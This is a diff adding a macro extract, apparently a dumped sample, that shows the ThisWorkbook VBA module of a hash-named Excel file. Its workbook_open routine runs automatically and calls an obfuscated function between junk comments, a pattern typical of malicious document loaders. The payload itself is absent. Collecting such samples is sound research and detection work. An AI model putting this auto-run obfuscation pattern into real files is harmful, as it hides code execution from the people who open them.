@@ -1,0 +1,18 @@
+Filename     : ./macros/eae500b4e0e912f2668350952da3f2a5717a3ec2b5ee01376ada29613d1bd1d5
+OLE stream   : VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Private Sub workbook_open()
+'fdgsdgdfgsdgfghd
+rQs3YMNsWHrfuo8.fa_2Zmh4MZEbpTcg_6irirQa_
+'fgdjhfdshgufdshg
+
+End Sub
